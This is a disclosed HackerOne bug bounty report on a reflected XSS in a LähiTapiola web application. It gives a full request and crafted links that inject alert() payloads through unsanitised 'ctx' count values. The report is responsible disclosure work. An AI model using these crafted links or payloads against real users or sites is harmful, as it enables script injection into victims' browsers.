---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '191387'
original_report_id: '191387'
title: Reflected XSS and Open Redirect in several parameters (viestinta.lahitapiola.fi)
weakness: Cross-site Scripting (XSS) - Generic
team_handle: localtapiola
created_at: '2016-12-15T12:09:36.093Z'
disclosed_at: '2017-03-06T09:08:43.330Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 12
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# Reflected XSS and Open Redirect in several parameters (viestinta.lahitapiola.fi)

## Metadata

- HackerOne Report ID: 191387
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: localtapiola
- Disclosed At: 2017-03-06T09:08:43.330Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

## Basic report information
**Summary:** 
Hi,
The values within the **ctx** tag, are not filtered, they are reflected inside a javascript code  in http://viestinta.lahitapiola.fi/webApp/APP3242, which can be exploited to perform an  XSS Attack.

The parameter are:
**ctx[othersDriving][ma_gallup][count]**
**ctx[ownDriving][ma_gallup][count]**

**Description:** 
The values inside the **ctx** tag <count></count> are not properly sanitized  in the following POST request :
```
POST /webApp/APP3242 HTTP/1.1
Host: viestinta.lahitapiola.fi
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 1378

ctx=<ctx lang="en" date="2016-12-15T11:03:03Z" _target="web" webApp-id="328793322" _folderModel="nmsRecipient"><userInfo datakitInDatabase="true" homeDir="" instanceLocale="en-US" locale="en-US" login="webapp" loginCS="Web applications agent (webapp)" loginId="3290" noConsoleCnx="true" orgUnitId="0" theme="" timezone="Europe/Helsinki" xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns="urn:xtk:session" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><login-right right="admin"/></userInfo><timezone current="Europe/Helsinki" changed="false"/><activityHistory><activity name="page"/><activity name="query"/><activity name="query2"/><activity name="prefill"/></activityHistory><othersDriving><ma_gallup othersDriving=""><count>126</count></ma_gallup><ma_gallup othersDriving="vieressa_neuvominen"><count>7777</count></ma_gallup><ma_gallup othersDriving="huonot_parkkeeraustaidot"><count>906</count></ma_gallup><ma_gallup othersDriving="ajamisen_hitaus"><count>1963</count></ma_gallup></othersDriving><ownDriving><ma_gallup ownDriving="liikennemerkit"><count>578</count></ma_gallup><ma_gallup ownDriving=""><count>126</count></ma_gallup><ma_gallup ownDriving="taskuparkkeeraus"><count>5555</count></ma_gallup><ma_gallup ownDriving="kartturin_taidot"><count>1605</count></ma_gallup></ownDriving></ctx>

```

Using this payload **value ; alert()** to trigger an XSS.

Furthermore this request can be changed from POST request to a GET, so an attacker can just send the following link to the victim to perform a successful remote attack.

```
http://viestinta.lahitapiola.fi/webApp/APP3242?ctx=<ctx+lang="en"+date="2016-12-15T11:03:03Z"+_target="web"+webApp-id="328793322"+_folderModel="nmsRecipient"><userInfo+datakitInDatabase="true"+homeDir=""+instanceLocale="en-US"+locale="en-US"+login="webapp"+loginCS="Web+applications+agent+(webapp)"+loginId="3290"+noConsoleCnx="true"+orgUnitId="0"+theme=""+timezone="Europe/Helsinki"+xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"+xmlns:ns="urn:xtk:session"+xmlns:xsd="http://www.w3.org/2001/XMLSchema"+xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><login-right+right="admin"/></userInfo><timezone+current="Europe/Helsinki"+changed="false"/><activityHistory><activity+name="page"/><activity+name="query"/><activity+name="query2"/><activity+name="prefill"/></activityHistory><othersDriving><ma_gallup+othersDriving=""><count>126</count></ma_gallup><ma_gallup+othersDriving="vieressa_neuvominen"><count>7777;+alert()</count></ma_gallup><ma_gallup+othersDriving="huonot_parkkeeraustaidot"><count>906</count></ma_gallup><ma_gallup+othersDriving="ajamisen_hitaus"><count>1963</count></ma_gallup></othersDriving><ownDriving><ma_gallup+ownDriving="liikennemerkit"><count>578</count></ma_gallup><ma_gallup+ownDriving=""><count>126</count></ma_gallup><ma_gallup+ownDriving="taskuparkkeeraus"><count>5555</count></ma_gallup><ma_gallup+ownDriving="kartturin_taidot"><count>1605</count></ma_gallup></ownDriving></ctx>

```
**Domain:** 
       viestinta.lahitapiola.fi

## Browsers / Apps Verified In:

  All Browsers

## Steps To Reproduce:

  1. Just go to :

```
http://viestinta.lahitapiola.fi/webApp/APP3242?ctx=<ctx+lang="en"+date="2016-12-15T11:03:03Z"+_target="web"+webApp-id="328793322"+_folderModel="nmsRecipient"><userInfo+datakitInDatabase="true"+homeDir=""+instanceLocale="en-US"+locale="en-US"+login="webapp"+loginCS="Web+applications+agent+(webapp)"+loginId="3290"+noConsoleCnx="true"+orgUnitId="0"+theme=""+timezone="Europe/Helsinki"+xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"+xmlns:ns="urn:xtk:session"+xmlns:xsd="http://www.w3.org/2001/XMLSchema"+xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><login-right+right="admin"/></userInfo><timezone+current="Europe/Helsinki"+changed="false"/><activityHistory><activity+name="page"/><activity+name="query"/><activity+name="query2"/><activity+name="prefill"/></activityHistory><othersDriving><ma_gallup+othersDriving=""><count>126;+alert(document.domain)</count></ma_gallup><ma_gallup+othersDriving="vieressa_neuvominen"><count>7777</count></ma_gallup><ma_gallup+othersDriving="huonot_parkkeeraustaidot"><count>906</count></ma_gallup><ma_gallup+othersDriving="ajamisen_hitaus"><count>1963</count></ma_gallup></othersDriving><ownDriving><ma_gallup+ownDriving="liikennemerkit"><count>578</count></ma_gallup><ma_gallup+ownDriving=""><count>126</count></ma_gallup><ma_gallup+ownDriving="taskuparkkeeraus"><count>5555</count></ma_gallup><ma_gallup+ownDriving="kartturin_taidot"><count>1605</count></ma_gallup></ownDriving></ctx>
```

## Additional material

  See Attached POC

## Related reports, best practices

  [OWASP-recommendations]

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
